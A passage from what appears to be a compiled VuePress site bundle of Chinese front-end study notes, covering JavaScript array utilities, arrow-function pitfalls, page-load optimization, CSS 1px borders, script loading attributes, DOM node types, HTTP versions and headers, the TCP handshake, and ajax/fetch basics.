math.max(...[1,2,3,4])\n\n\n# 去重unique\n\n let array = [\n  { id: 1, name: "a" },\n  { id: 2, name: "b" },\n  { id: 3, name: "c" },\n  { id: 5, name: "d" },\n  { id: 1, name: "e" },\n];\nfunction unique(arr,key){\n  let obj = {}\n  return arr.reduce((accumulator,currentvalue,currentindex)=>{\n   //当前key键的value值存在于obj函数中时,说明重复\n    if(!obj[currentvalue[key]]){\n      obj[currentvalue[key]]=true\n      accumulator.push(currentvalue)\n    }\n    return accumulator\n  },[])\n}\nconsole.log(\'unique(array,id) :>> \', unique(array,\'id\'));\n\n\n# 扁平化flatten\n\nfunction flatten(arr){\n  return arr.reduce((accumulator,currentvalue,currentindex)=>{\n    return accumulator.concat(array.isarray(currentvalue)?flatten(currentvalue):currentvalue)\n  },[])\n}\nconsole.log(flatten([1,[2,3],[4,5,[6,7]]]))\n',charsets:{cjk:!0}},{title:"箭头函数",frontmatter:{title:"箭头函数"},regularPath:"/webstudy/ES6%E5%8F%8A%E4%BB%A5%E4%B8%8A/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0.html",relativePath:"webstudy/ES6及以上/箭头函数.md",key:"v-4e2bb218",path:"/webstudy/ES6%E5%8F%8A%E4%BB%A5%E4%B8%8A/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0.html",headers:[{level:2,title:"箭头函数",slug:"箭头函数",normalizedTitle:"箭头函数",charIndex:2},{level:3,title:"箭头函数的缺点",slug:"箭头函数的缺点",normalizedTitle:"箭头函数的缺点",charIndex:11},{level:3,title:"哪些场景不能使用this",slug:"哪些场景不能使用this",normalizedTitle:"哪些场景不能使用this",charIndex:387}],headersStr:"箭头函数 箭头函数的缺点 哪些场景不能使用this",content:"# 箭头函数\n\n\n# 箭头函数的缺点\n\n * 1、没有arguments\n\nconst fn =()=>{\n  console.log(arguments)\n}\nfn(100,200) //arguments is not defined\n\n\n * 2、无法通过apply，bind，call来改变this,箭头函数的this指向其父作用域\n\nconst fn2 =()=>{\n  console.log('this :>> ', this);\n}\nfn2() //this指向window对象\nfn2.apply({a:1}) //无法通过此方法改变this，打印后this仍指向window\n\nfunction fn3(){\n  console.log('this :>> ', this);\n}\nfn3.apply({a:1}) //this指向{a:1}\n\n\n\n# 哪些场景不能使用this\n\n * 1、对象方法\n\nlet obj = {\n  name:'yang',\n  say:()=>{\n    return this.name\n  }\n}\nconsole.log('obj.say() :>> ', obj.say()); //获取不到此方法\n\n\n * 2、原型方法\n\nlet obj = {\n  name:'yang'\n}\nobj.__proto__.getName = ()=>{\n  return this.name\n}\nconsole.log(obj.getName()); //获取不到\n\n\n\n * 3、构造函数\n\nconst fn4 = (name)=>{\n  this.name= name\n}\nlet f = new fn4('yang')\nconsole.log('f :>> ', f); //fn4 is not a constructor\n\n\n\n * 4、Vue的生命周期和method\n\n以下的代码完全不可以\n\n{\ndata(){\n  return {\n    name:'yang'\n  }\n}\nmounted:()=>{\n  console.log(this.name)\n}\nmethods: {\n  say:()=>{\n    return this.name\n  }\n}\n}\n\n\n可以理解为Vue本身是个对象，如同第一点所说对象中的方法不能使用箭头函数\n\n> 注：class中可以使用箭头函数",normalizedContent:"# 箭头函数\n\n\n# 箭头函数的缺点\n\n * 1、没有arguments\n\nconst fn =()=>{\n  console.log(arguments)\n}\nfn(100,200) //arguments is not defined\n\n\n * 2、无法通过apply，bind，call来改变this,箭头函数的this指向其父作用域\n\nconst fn2 =()=>{\n  console.log('this :>> ', this);\n}\nfn2() //this指向window对象\nfn2.apply({a:1}) //无法通过此方法改变this，打印后this仍指向window\n\nfunction fn3(){\n  console.log('this :>> ', this);\n}\nfn3.apply({a:1}) //this指向{a:1}\n\n\n\n# 哪些场景不能使用this\n\n * 1、对象方法\n\nlet obj = {\n  name:'yang',\n  say:()=>{\n    return this.name\n  }\n}\nconsole.log('obj.say() :>> ', obj.say()); //获取不到此方法\n\n\n * 2、原型方法\n\nlet obj = {\n  name:'yang'\n}\nobj.__proto__.getname = ()=>{\n  return this.name\n}\nconsole.log(obj.getname()); //获取不到\n\n\n\n * 3、构造函数\n\nconst fn4 = (name)=>{\n  this.name= name\n}\nlet f = new fn4('yang')\nconsole.log('f :>> ', f); //fn4 is not a constructor\n\n\n\n * 4、vue的生命周期和method\n\n以下的代码完全不可以\n\n{\ndata(){\n  return {\n    name:'yang'\n  }\n}\nmounted:()=>{\n  console.log(this.name)\n}\nmethods: {\n  say:()=>{\n    return this.name\n  }\n}\n}\n\n\n可以理解为vue本身是个对象，如同第一点所说对象中的方法不能使用箭头函数\n\n> 注：class中可以使用箭头函数",charsets:{cjk:!0}},{title:"首屏优化",frontmatter:{title:"首屏优化"},regularPath:"/webstudy/Experience/%E9%A6%96%E5%B1%8F%E4%BC%98%E5%8C%96.html",relativePath:"webstudy/Experience/首屏优化.md",key:"v-b97afcba",path:"/webstudy/Experience/%E9%A6%96%E5%B1%8F%E4%BC%98%E5%8C%96.html",headers:[{level:2,title:"1、SPA单页面路由懒加载",slug:"_1、spa单页面路由懒加载",normalizedTitle:"1、spa单页面路由懒加载",charIndex:11},{level:2,title:"2、服务端渲染 SSR（首屏优化的终极方案）",slug:"_2、服务端渲染-ssr-首屏优化的终极方案",normalizedTitle:"2、服务端渲染 ssr（首屏优化的终极方案）",charIndex:144},{level:2,title:"3、App 预取",slug:"_3、app-预取",normalizedTitle:"3、app 预取",charIndex:215},{level:2,title:"分页",slug:"分页",normalizedTitle:"分页",charIndex:458},{level:2,title:"图片懒加载",slug:"图片懒加载",normalizedTitle:"图片懒加载",charIndex:465},{level:2,title:"其他的体验优化",slug:"其他的体验优化",normalizedTitle:"其他的体验优化",charIndex:475}],headersStr:"1、SPA单页面路由懒加载 2、服务端渲染 SSR（首屏优化的终极方案） 3、App 预取 分页 图片懒加载 其他的体验优化",content:"# 首屏优化\n\n\n# 1、SPA单页面路由懒加载\n\n * 先加载首页路由，Vue本身支持路由懒加载\n\nconst Home = () => import(/* webpackChunkName: 'HomeComponents' */ '@/components/home')\n\n\n\n# 2、服务端渲染 SSR（首屏优化的终极方案）\n\n * 网页内容由服务端生成 首屏时间短 有利于seo 如下图\n\n * Nuxt.js\n\n\n# 3、App 预取\n\n如果 H5 在 App webview 中展示，可以使用 App 预取资源\n\n * 在列表页，App 预取数据（一般是标题、首页文本，不包括图片、视频）\n * 进入详情页，H5 直接即可渲染 App 预取的数据\n * 可能会造成“浪费”：预期了，但用户未进入该详情页 —— 不过没关系，现在流量便宜\n\n例如，你在浏览朋友圈时，可以快速的打开某个公众号的文章。\n\n这里可以联想到 prefetch ，不过它是预取 js css 等静态资源，并不是首屏的内容。\n\n\n# 分页\n\n\n# 图片懒加载\n\n\n# 其他的体验优化\n\n骨架屏 loading",normalizedContent:"# 首屏优化\n\n\n# 1、spa单页面路由懒加载\n\n * 先加载首页路由，vue本身支持路由懒加载\n\nconst home = () => import(/* webpackchunkname: 'homecomponents' */ '@/components/home')\n\n\n\n# 2、服务端渲染 ssr（首屏优化的终极方案）\n\n * 网页内容由服务端生成 首屏时间短 有利于seo 如下图\n\n * nuxt.js\n\n\n# 3、app 预取\n\n如果 h5 在 app webview 中展示，可以使用 app 预取资源\n\n * 在列表页，app 预取数据（一般是标题、首页文本，不包括图片、视频）\n * 进入详情页，h5 直接即可渲染 app 预取的数据\n * 可能会造成“浪费”：预期了，但用户未进入该详情页 —— 不过没关系，现在流量便宜\n\n例如，你在浏览朋友圈时，可以快速的打开某个公众号的文章。\n\n这里可以联想到 prefetch ，不过它是预取 js css 等静态资源，并不是首屏的内容。\n\n\n# 分页\n\n\n# 图片懒加载\n\n\n# 其他的体验优化\n\n骨架屏 loading",charsets:{cjk:!0}},{title:"Retina屏幕1px宽度",frontmatter:{title:"Retina屏幕1px宽度"},regularPath:"/webstudy/CSS/Retina%E5%B1%8F%E5%B9%951px%E5%AE%BD%E5%BA%A6.html",relativePath:"webstudy/CSS/Retina屏幕1px宽度.md",key:"v-e451ceda",path:"/webstudy/CSS/Retina%E5%B1%8F%E5%B9%951px%E5%AE%BD%E5%BA%A6.html",headers:[{level:2,title:"普通的 1px",slug:"普通的-1px",normalizedTitle:"普通的 1px",charIndex:52},{level:2,title:"可以使用 transform 缩小",slug:"可以使用-transform-缩小",normalizedTitle:"可以使用 transform 缩小",charIndex:263},{level:2,title:"继续思考？如果有 border-radius 怎么办",slug:"继续思考-如果有-border-radius-怎么办",normalizedTitle:"继续思考？如果有 border-radius 怎么办",charIndex:595}],headersStr:"普通的 1px 可以使用 transform 缩小 继续思考？如果有 border-radius 怎么办",content:"# Retina屏幕1px宽度\n\n思考？Retina(视网膜) 屏 1px 像素问题，如何实现\n\n\n# 普通的 1px\n\n如果仅仅使用 css 的 1px 来设置 border ，那可能会出现比较粗的情况。\n因为，有些手机屏幕的 DPR = 2 ，即 1px 它会用两个物理像素来显示，就粗了。\n\n#box {\n    padding: 10px 0;\n    border-bottom: 1px solid #eee;\n}\n\n\n注意：不能直接写 0.5px ，浏览器兼容性不好，渲染出来可能还是 1px 的效果。\n\n\n# 可以使用 transform 缩小\n\n使用 css 伪类 + transform 来优化这一问题。即把默认的 1px 宽度给压缩 0.5 倍。\n\n#box {\n    padding: 10px 0;\n    position: relative;\n}\n#box::before {\n    content: '';\n    position: absolute;\n    left: 0;\n    bottom: 0;\n    width: 100%;\n    height: 1px;\n    background: #d9d9d9;\n    transform: scaleY(0.5);\n    transform-origin: 0 0;\n}\n\n\n\n# 继续思考？如果有 border-radius 怎么办\n\n可以使用 box-shadow 设置\n\n * X 偏移量 0\n * Y 偏移量 0\n * 阴影模糊半径 0\n * 阴影扩散半径 0.5px\n * 阴影颜色\n\n#box2 {\n    margin-top: 20px;\n    padding: 10px;\n    border-radius: 5px;\n    /* border: 1px solid #d9d9d9; */\n    box-shadow: 0 0 0 0.5px #d9d9d9;\n}\n",normalizedContent:"# retina屏幕1px宽度\n\n思考？retina(视网膜) 屏 1px 像素问题，如何实现\n\n\n# 普通的 1px\n\n如果仅仅使用 css 的 1px 来设置 border ，那可能会出现比较粗的情况。\n因为，有些手机屏幕的 dpr = 2 ，即 1px 它会用两个物理像素来显示，就粗了。\n\n#box {\n    padding: 10px 0;\n    border-bottom: 1px solid #eee;\n}\n\n\n注意：不能直接写 0.5px ，浏览器兼容性不好，渲染出来可能还是 1px 的效果。\n\n\n# 可以使用 transform 缩小\n\n使用 css 伪类 + transform 来优化这一问题。即把默认的 1px 宽度给压缩 0.5 倍。\n\n#box {\n    padding: 10px 0;\n    position: relative;\n}\n#box::before {\n    content: '';\n    position: absolute;\n    left: 0;\n    bottom: 0;\n    width: 100%;\n    height: 1px;\n    background: #d9d9d9;\n    transform: scaley(0.5);\n    transform-origin: 0 0;\n}\n\n\n\n# 继续思考？如果有 border-radius 怎么办\n\n可以使用 box-shadow 设置\n\n * x 偏移量 0\n * y 偏移量 0\n * 阴影模糊半径 0\n * 阴影扩散半径 0.5px\n * 阴影颜色\n\n#box2 {\n    margin-top: 20px;\n    padding: 10px;\n    border-radius: 5px;\n    /* border: 1px solid #d9d9d9; */\n    box-shadow: 0 0 0 0.5px #d9d9d9;\n}\n",charsets:{cjk:!0}},{title:"defer和async",frontmatter:{title:"defer和async"},regularPath:"/webstudy/HTML/defer%E5%92%8Casync.html",relativePath:"webstudy/HTML/defer和async.md",key:"v-b3858932",path:"/webstudy/HTML/defer%E5%92%8Casync.html",headers:[{level:2,title:"script标签的defer和async属性",slug:"script标签的defer和async属性",normalizedTitle:"script标签的defer和async属性",charIndex:18},{level:2,title:"preload和refetch",slug:"preload和refetch",normalizedTitle:"preload和refetch",charIndex:283},{level:2,title:"dns-prefetch和preconnect",slug:"dns-prefetch和preconnect",normalizedTitle:"dns-prefetch和preconnect",charIndex:813}],headersStr:"script标签的defer和async属性 preload和refetch dns-prefetch和preconnect",content:'# defer和async\n\n\n# script标签的defer和async属性\n\n * <script src="xxx.js"> 当解析到该标签时，会暂停 html 解析，并触发 js 下载、执行。然后再继续 html 解析。\n * <script async src="xxx.js"> js 下载和 html 解析可并行，下载完之后暂停 html 解析，执行 js 。然后再继续 html 解析。\n * <script defer src="xxx.js"> js 下载和 html 解析可并行。等待 html 解析完之后再执行 js 。\n\n如下图\n\n\n# preload和refetch\n\n * preload 表示资源在当前页面使用，浏览器会优先加载\n * prefetch 表示资源可能在未来的页面（如通过链接打开下一个页面）使用，浏览器将在空闲时加载\n\n<head>\n  <meta charset="utf-8">\n  <title>JS and CSS preload</title>\n\n  \x3c!-- preload --\x3e\n  <link rel="preload" href="style.css" as="style">\n  <link rel="preload" href="main.js" as="script">\n\n  \x3c!-- prefetch --\x3e\n  <link rel="prefetch" href="other.js" as="script">\n\n  \x3c!-- 引用 css --\x3e\n  <link rel="stylesheet" href="style.css">\n</head>\n\n<body>\n  <h1>hello</h1>\n\n  \x3c!-- 引用 js --\x3e\n  <script src="main.js" defer><\/script>\n</body>\n\n\n\n# dns-prefetch和preconnect\n\n浏览器要建立一个连接，一般需要经过DNS查找，TCP三次握手和TLS协商（如果是https的话），这些过程都是需要相当的耗时的，所以preconnet，就是一项使浏览器能够预先建立一个连接，等真正需要加载资源的时候就能够直接请求了。\n\ndns-prefetch 即 DNS 预获取，preconnect 即预连接。\n\n\n * dns-prefetch就是一项使浏览器主动去执行域名解析的功能\n * 当网页请求第三方资源时，可以提前进行 DNS 查询、TCP 连接，以减少请求时的时间。\n\n<html>\n  <head>\n    <link rel="dns-prefetch" href="https://fonts.gstatic.com/">\n    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>\n\n  </head>\n  <body>\n      <p>hello</p>\n  </body>\n</html>\n',normalizedContent:'# defer和async\n\n\n# script标签的defer和async属性\n\n * <script src="xxx.js"> 当解析到该标签时，会暂停 html 解析，并触发 js 下载、执行。然后再继续 html 解析。\n * <script async src="xxx.js"> js 下载和 html 解析可并行，下载完之后暂停 html 解析，执行 js 。然后再继续 html 解析。\n * <script defer src="xxx.js"> js 下载和 html 解析可并行。等待 html 解析完之后再执行 js 。\n\n如下图\n\n\n# preload和refetch\n\n * preload 表示资源在当前页面使用，浏览器会优先加载\n * prefetch 表示资源可能在未来的页面（如通过链接打开下一个页面）使用，浏览器将在空闲时加载\n\n<head>\n  <meta charset="utf-8">\n  <title>js and css preload</title>\n\n  \x3c!-- preload --\x3e\n  <link rel="preload" href="style.css" as="style">\n  <link rel="preload" href="main.js" as="script">\n\n  \x3c!-- prefetch --\x3e\n  <link rel="prefetch" href="other.js" as="script">\n\n  \x3c!-- 引用 css --\x3e\n  <link rel="stylesheet" href="style.css">\n</head>\n\n<body>\n  <h1>hello</h1>\n\n  \x3c!-- 引用 js --\x3e\n  <script src="main.js" defer><\/script>\n</body>\n\n\n\n# dns-prefetch和preconnect\n\n浏览器要建立一个连接，一般需要经过dns查找，tcp三次握手和tls协商（如果是https的话），这些过程都是需要相当的耗时的，所以preconnet，就是一项使浏览器能够预先建立一个连接，等真正需要加载资源的时候就能够直接请求了。\n\ndns-prefetch 即 dns 预获取，preconnect 即预连接。\n\n\n * dns-prefetch就是一项使浏览器主动去执行域名解析的功能\n * 当网页请求第三方资源时，可以提前进行 dns 查询、tcp 连接，以减少请求时的时间。\n\n<html>\n  <head>\n    <link rel="dns-prefetch" href="https://fonts.gstatic.com/">\n    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>\n\n  </head>\n  <body>\n      <p>hello</p>\n  </body>\n</html>\n',charsets:{cjk:!0}},{title:"node和element",frontmatter:{title:"node和element"},regularPath:"/webstudy/HTML/node%E5%92%8Celement.html",relativePath:"webstudy/HTML/node和element.md",key:"v-069b9fca",path:"/webstudy/HTML/node%E5%92%8Celement.html",headers:[{level:3,title:"node和element",slug:"node和element",normalizedTitle:"node和element",charIndex:2},{level:3,title:"HTMLCollection和NodeList",slug:"htmlcollection和nodelist",normalizedTitle:"htmlcollection和nodelist",charIndex:106}],headersStr:"node和element HTMLCollection和NodeList",content:"# node和element\n\n\n\n * DOM树的每一个节点都是node\n * Node是一个基类，是Element的基类\n * ELement是其他HTML元素的基类，如HTMLDivElement\n\n\n# HTMLCollection和NodeList\n\n * HTMLCollection是Element的集合\n * NodeList是node的集合\n\n<html>\n  <p id=\"p1\">\n    <span>标签1</span><b>标签2</b>\n  </p>\n</html>\n<script>\n  const p = document.getElementById('p1')\n  console.log('p :>> ', p); \n  //children和childNodes的明显区别\n  //children是Element中的节点，div，span等标签\n  console.log('p.children :>> ', p.children); //HTMLCollection(2)  [span, b]\n  //childNodes包含node节点，包括text和comment等\n  console.log('p.childNodes :>> ', p.childNodes); //NodeList(4)  [text, span, b, text]\n<\/script>\n\n\n> 注：HTMLCollection和NodeList不是数组，是类数组\n\n# 那么如何将类数组编程数组\n\n * Array.from(list)\n * Array.prototype.slice.call(list)\n * [...list]",normalizedContent:"# node和element\n\n\n\n * dom树的每一个节点都是node\n * node是一个基类，是element的基类\n * element是其他html元素的基类，如htmldivelement\n\n\n# htmlcollection和nodelist\n\n * htmlcollection是element的集合\n * nodelist是node的集合\n\n<html>\n  <p id=\"p1\">\n    <span>标签1</span><b>标签2</b>\n  </p>\n</html>\n<script>\n  const p = document.getelementbyid('p1')\n  console.log('p :>> ', p); \n  //children和childnodes的明显区别\n  //children是element中的节点，div，span等标签\n  console.log('p.children :>> ', p.children); //htmlcollection(2)  [span, b]\n  //childnodes包含node节点，包括text和comment等\n  console.log('p.childnodes :>> ', p.childnodes); //nodelist(4)  [text, span, b, text]\n<\/script>\n\n\n> 注：htmlcollection和nodelist不是数组，是类数组\n\n# 那么如何将类数组编程数组\n\n * array.from(list)\n * array.prototype.slice.call(list)\n * [...list]",charsets:{cjk:!0}},{title:"Http协议1.0,1.1,2.0",frontmatter:{title:"Http协议1.0,1.1,2.0"},regularPath:"/webstudy/HTTP/Http%E5%8D%8F%E8%AE%AE1.0,1.1,2.0.html",relativePath:"webstudy/HTTP/Http协议1.0,1.1,2.0.md",key:"v-5e76828e",path:"/webstudy/HTTP/Http%E5%8D%8F%E8%AE%AE1.0,1.1,2.0.html",headers:[{level:2,title:"Http1.0",slug:"http1-0",normalizedTitle:"http1.0",charIndex:237},{level:2,title:"Http1.1",slug:"http1-1",normalizedTitle:"http1.1",charIndex:268},{level:2,title:"Http2.0",slug:"http2-0",normalizedTitle:"http2.0",charIndex:437},{level:3,title:"Restful API",slug:"restful-api",normalizedTitle:"restful api",charIndex:362},{level:2,title:"https",slug:"https",normalizedTitle:"https",charIndex:710},{level:2,title:"http Headers",slug:"http-headers",normalizedTitle:"http headers",charIndex:781},{level:3,title:"request Headers",slug:"request-headers",normalizedTitle:"request headers",charIndex:798},{level:3,title:"Response Headers",slug:"response-headers",normalizedTitle:"response headers",charIndex:1171}],headersStr:"Http1.0 Http1.1 Http2.0 Restful API https http Headers request Headers Response Headers",content:"# Http协议\n\n超文本传输协议HTTP协议被用于在Web浏览器和网站服务器之间传递信息 HTTP协议传输的数据都是未加密的，也就是明文的，因此使用HTTP协议传输隐私信息非常不安全，为了保证这些隐私数据能加密传输，于是网景公司设计了SSL（Secure Sockets Layer）协议用于对HTTP协议传输的数据进行加密，从而就诞生了HTTPS。简单来说，HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全。\n\n\n# Http1.0\n\n * 只能支持get和post请求\n\n\n# Http1.1\n\n * 引入更多的缓存策略，如 cache-control E-tag\n * 支持断点续传，状态吗 206\n * 增加新的 method PUT DELETE 等，可以设计Restful API\n * 长链接，默认开启 Connection: keep-alive ，多次 http 请求减少了 TCP 连接次数\n\n\n# Http2.0\n\n * 支持header 压缩，以减少请求体积\n * 多路复用，一个 TCP 连接中可以多个 http 并行请求。拼接资源（如雪碧图、多 js 拼接一个）将变的多余\n * 服务器端推送\n\n\n# Restful API\n\n> 用URL定位资源、用HTTP动词（GET,POST,PUT,DELETE)描述操作\n\n * GET（SELECT）：从服务器取出资源。\n * POST（CREATE）：在服务器新建一个资源。\n * PUT（UPDATE）：在服务器更新资源。\n * DELETE（DELETE）：从服务器删除资源。\n\n\n# https\n\nhttp + TLS/SSL = https ，即加密传输信息。只有客户端和服务端可以解密为明文，中间的过程无法解密。\n\n\n# http Headers\n\n\n# request Headers\n\n * accept: */* 可接受的数据格式\n * accept-encoding: gzip, deflate, br 浏览器可接收的压缩算法\n * accept-language: zh-CN,zh;q=0.9,en;q=0.8 语言\n * user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\n * cookie\n * host 请求的域名\n * Content-type 发送数据的格式\n * Expires 强缓存http1.0\n * Cache-Control 强缓存http1.1\n\n\n# Response Headers\n\n * content-type 服务端向客户端返回的数据的格式\n * Content-length 返回数据的大小\n * set-cookie 服务端向客户端设置cookie\n * Date\n * Content-Encoding 浏览器可接收的压缩算法",normalizedContent:"# http协议\n\n超文本传输协议http协议被用于在web浏览器和网站服务器之间传递信息 http协议传输的数据都是未加密的，也就是明文的，因此使用http协议传输隐私信息非常不安全，为了保证这些隐私数据能加密传输，于是网景公司设计了ssl（secure sockets layer）协议用于对http协议传输的数据进行加密，从而就诞生了https。简单来说，https协议是由ssl+http协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全。\n\n\n# http1.0\n\n * 只能支持get和post请求\n\n\n# http1.1\n\n * 引入更多的缓存策略，如 cache-control e-tag\n * 支持断点续传，状态吗 206\n * 增加新的 method put delete 等，可以设计restful api\n * 长链接，默认开启 connection: keep-alive ，多次 http 请求减少了 tcp 连接次数\n\n\n# http2.0\n\n * 支持header 压缩，以减少请求体积\n * 多路复用，一个 tcp 连接中可以多个 http 并行请求。拼接资源（如雪碧图、多 js 拼接一个）将变的多余\n * 服务器端推送\n\n\n# restful api\n\n> 用url定位资源、用http动词（get,post,put,delete)描述操作\n\n * get（select）：从服务器取出资源。\n * post（create）：在服务器新建一个资源。\n * put（update）：在服务器更新资源。\n * delete（delete）：从服务器删除资源。\n\n\n# https\n\nhttp + tls/ssl = https ，即加密传输信息。只有客户端和服务端可以解密为明文，中间的过程无法解密。\n\n\n# http headers\n\n\n# request headers\n\n * accept: */* 可接受的数据格式\n * accept-encoding: gzip, deflate, br 浏览器可接收的压缩算法\n * accept-language: zh-cn,zh;q=0.9,en;q=0.8 语言\n * user-agent: mozilla/5.0 (macintosh; intel mac os x 10_15_7) applewebkit/537.36 (khtml, like gecko) chrome/103.0.0.0 safari/537.36\n * cookie\n * host 请求的域名\n * content-type 发送数据的格式\n * expires 强缓存http1.0\n * cache-control 强缓存http1.1\n\n\n# response headers\n\n * content-type 服务端向客户端返回的数据的格式\n * content-length 返回数据的大小\n * set-cookie 服务端向客户端设置cookie\n * date\n * content-encoding 浏览器可接收的压缩算法",charsets:{cjk:!0}},{title:"TCP三次握手四次挥手",frontmatter:{title:"TCP三次握手四次挥手"},regularPath:"/webstudy/HTTP/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B.html",relativePath:"webstudy/HTTP/TCP三次握手四次挥手.md",key:"v-7198a9df",path:"/webstudy/HTTP/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B.html",headers:[{level:2,title:"建立连接",slug:"建立连接",normalizedTitle:"建立连接",charIndex:156},{level:2,title:"三次握手",slug:"三次握手",normalizedTitle:"三次握手",charIndex:9},{level:2,title:"四次挥手",slug:"四次挥手",normalizedTitle:"四次挥手",charIndex:14}],headersStr:"建立连接 三次握手 四次挥手",content:"# TCP 连接 三次握手 四次挥手\n\n * 客户端发包，服务端接收。服务端确认：客户端已经请求结束\n * 服务端发包，客户端接收。客户端确认：服务端已经收到，我等待它关闭\n * 服务端发包：客户端接受。客户端确认：服务端已经发送完成，可以关闭\n * 客户端发包，服务端接收。服务端确认：可以关闭了\n\n\n\n\n# 建立连接\n\n客户端和服务端通过 HTTP 协议发送请求，并获取内容。\n\n在发送请求之前，需要先建立连接，确定目标机器处于可接受请求的状态。\n就例如，你要请快递员（第三方的）去张三家取一个东西，你必须先打电话问问他在不在家。这就是建立连接的过程。\n\nHTTP 协议是一个应用层的协议，它只规定了 req 和 res 的数据格式，如状态码、header、body 等。\n而建立网络连接需要更加底层的 TCP 协议。\n\n\n# 三次握手\n\n三次握手，即建立一次 TCP 连接时，客户端和服务端总共需要发送 3 个包。\n\n先举一个例子。还是你要派人去张三家取一个东西，现在你要发短信（不是打电话）“建立连接”，至少需要 3 个步骤，缺一不可。\n\n * 你：在家吗？\n * 张三：在家\n * 你：好，这就过去（然后你指派人上门，张三准备迎接）\n\n过程\n\n * 客户端发包，服务端收到。服务端确认：客户端的发送能力是正常的。\n * 服务端发包，客户端收到。客户端确认：服务端的接收能力是正常的。\n * 客户端发包，服务端收到。服务端确认：客户端即将给我发送数据，我要准备接收。\n\n建立连接完成，然后就开始发送数据，通讯。\n\n\n# 四次挥手\n\n握手，是建立连接。挥手，就是告别，就是关闭连接。\n\n还是之前的例子。取东西，不一定一次就取完，可能要来回很多次。而且，也不一定全部由你主动发起，过程中张三也可能会主动派人给你发送。\n即，你在 chrome 中看到的是一次 http 请求，其实背后可能需要好几次网络传输，只不过浏览器给合并起来了。\n\n好了，取东西完毕了，你要发短信“关闭连接”，告诉张三可以关门了，需要 4 个步骤。\n【注意】这里你需要等着确认张三关门，才算是完全关闭连接，不能你说一声就不管了。跟日常生活不一样。\n\n * 你：完事儿了\n * 张三：好的 （此时可能还要继续给你发送，你也得继续接收。直到张三发送完）\n * 张三：我发送完毕，准备关门了\n * 你：好，关门吧 （然后你可以走了，张三可以关门了，连接结束）",normalizedContent:"# tcp 连接 三次握手 四次挥手\n\n * 客户端发包，服务端接收。服务端确认：客户端已经请求结束\n * 服务端发包，客户端接收。客户端确认：服务端已经收到，我等待它关闭\n * 服务端发包：客户端接受。客户端确认：服务端已经发送完成，可以关闭\n * 客户端发包，服务端接收。服务端确认：可以关闭了\n\n\n\n\n# 建立连接\n\n客户端和服务端通过 http 协议发送请求，并获取内容。\n\n在发送请求之前，需要先建立连接，确定目标机器处于可接受请求的状态。\n就例如，你要请快递员（第三方的）去张三家取一个东西，你必须先打电话问问他在不在家。这就是建立连接的过程。\n\nhttp 协议是一个应用层的协议，它只规定了 req 和 res 的数据格式，如状态码、header、body 等。\n而建立网络连接需要更加底层的 tcp 协议。\n\n\n# 三次握手\n\n三次握手，即建立一次 tcp 连接时，客户端和服务端总共需要发送 3 个包。\n\n先举一个例子。还是你要派人去张三家取一个东西，现在你要发短信（不是打电话）“建立连接”，至少需要 3 个步骤，缺一不可。\n\n * 你：在家吗？\n * 张三：在家\n * 你：好，这就过去（然后你指派人上门，张三准备迎接）\n\n过程\n\n * 客户端发包，服务端收到。服务端确认：客户端的发送能力是正常的。\n * 服务端发包，客户端收到。客户端确认：服务端的接收能力是正常的。\n * 客户端发包，服务端收到。服务端确认：客户端即将给我发送数据，我要准备接收。\n\n建立连接完成，然后就开始发送数据，通讯。\n\n\n# 四次挥手\n\n握手，是建立连接。挥手，就是告别，就是关闭连接。\n\n还是之前的例子。取东西，不一定一次就取完，可能要来回很多次。而且，也不一定全部由你主动发起，过程中张三也可能会主动派人给你发送。\n即，你在 chrome 中看到的是一次 http 请求，其实背后可能需要好几次网络传输，只不过浏览器给合并起来了。\n\n好了，取东西完毕了，你要发短信“关闭连接”，告诉张三可以关门了，需要 4 个步骤。\n【注意】这里你需要等着确认张三关门，才算是完全关闭连接，不能你说一声就不管了。跟日常生活不一样。\n\n * 你：完事儿了\n * 张三：好的 （此时可能还要继续给你发送，你也得继续接收。直到张三发送完）\n * 张三：我发送完毕，准备关门了\n * 你：好，关门吧 （然后你可以走了，张三可以关门了，连接结束）",charsets:{cjk:!0}},{title:"ajax-fetch-axios",frontmatter:{title:"ajax-fetch-axios"},regularPath:"/webstudy/HTTP/ajax-fetch-axios.html",relativePath:"webstudy/HTTP/ajax-fetch-axios.md",key:"v-6d59cd32",path:"/webstudy/HTTP/ajax-fetch-axios.html",headers:[{level:2,title:"ajax",slug:"ajax",normalizedTitle:"ajax",charIndex:2},{level:3,title:"面试题：请用 XMLHttpRequest 实现 ajax",slug:"面试题-请用-xmlhttprequest-实现-ajax",normalizedTitle:"面试题：请用 xmlhttprequest 实现 ajax",charIndex:323},{level:2,title:"fetch",slug:"fetch",normalizedTitle:"fetch",charIndex:7},{level:3,title:"面试题：用 fetch 实现一个 ajax",slug:"面试题-用-fetch-实现一个-ajax",normalizedTitle:"面试题：用 fetch 实现一个 ajax",charIndex:816},{level:2,title:"axios",slug:"axios",normalizedTitle:"axios",charIndex:13}],headersStr:"ajax 面试题：请用 XMLHttpRequest 实现 ajax fetch 面试题：用 fetch 实现一个 ajax axios",content:'# ajax fetch axios 的区别\n\n * ajax 是一种技术称呼，不是具体的 API 和库\n * fetch 是新的异步请求 API ，可代替 XMLHttpRequest\n * axios 是第三方库\n\n\n# ajax\n\nAJAX （几个单词首字母，按规范应该大写） - Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）\n即使用 JS 进行异步请求，是 Web2.0 的技术基础，从 2005 年左右开始发起。\n所以，这里的 AJAX 就是一个称呼，一个缩写。\n\n基于当时 JS 规范，异步请求主要使用 XMLHttpRequest 这个底层 API 。\n所以，\n\n\n# 面试题：请用 XMLHttpRequest 实现 ajax\n\nfunction ajax(url, successFn) {\n    const xhr = new XMLHttpRequest()\n    xhr.open("GET", url, false)\n    xhr.onreadystatechange = function () {\n        // 这里的函数异步执行，可参考之前 JS 基础中的异步模块\n        if (xhr.readyState == 4) {\n            if 